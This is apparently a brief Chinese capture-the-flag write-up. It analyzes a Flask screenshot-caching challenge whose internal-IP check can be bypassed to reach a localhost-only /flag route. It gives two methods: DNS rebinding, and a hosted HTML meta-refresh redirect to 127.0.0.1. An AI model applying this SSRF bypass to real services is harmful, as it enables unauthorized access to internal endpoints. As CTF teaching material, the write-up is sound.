## 分析

```python
@web.route('/flag')
@is_from_localhost
def flag():
    return send_file('flag.png')
```

这里需要从本地发起的请求才能获得`flag`

```python
def cache_web(url):
    scheme = urlparse(url).scheme
    domain = urlparse(url).hostname

    if not domain or not scheme:
        return flash(f'Malformed url {url}', 'danger')
        
    if scheme not in ['http', 'https']:
        return flash('Invalid scheme', 'danger')

    def ip2long(ip_addr):
        return struct.unpack('!L', socket.inet_aton(ip_addr))[0]
    
    def is_inner_ipaddress(ip):
        ip = ip2long(ip)
        return ip2long('127.0.0.0') >> 24 == ip >> 24 or \
                ip2long('10.0.0.0') >> 24 == ip >> 24 or \
                ip2long('172.16.0.0') >> 20 == ip >> 20 or \
                ip2long('192.168.0.0') >> 16 == ip >> 16 or \
                ip2long('0.0.0.0') >> 24 == ip >> 24
    
    if is_inner_ipaddress(socket.gethostbyname(domain)):
        return flash('IP not allowed', 'danger')
    
    return serve_screenshot_from(url, domain)
```

`cache_web` 函数会发起一个请求并且把内容缓存下来。

这道题的思路可以使用`dns rebind`，或者也可以在我们的服务器上保存一个`index.html`文件，内容如下，这样当我们缓存的时候，加载`HTML`重定向到本地

```HTML
<META http-equiv=refresh content="0; URL=http://127.0.0.1/flag">
```

# 参考链接

[https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html)